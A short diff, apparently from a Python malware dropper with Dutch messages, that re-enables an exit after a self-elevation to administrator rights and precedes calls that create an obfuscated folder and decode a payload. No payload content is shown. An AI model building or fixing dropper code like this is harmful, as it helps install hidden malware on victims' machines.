@@ -120,7 +120,7 @@ if __name__ == "__main__":
     if not dropper.is_admin():
         print("Dit script vereist administratorrechten.")
         dropper.run_as_admin()
-        #sys.exit(0)
+        sys.exit(0)
 
     dropper.create_obfuscated_folder()
     dropper.decode_payload()
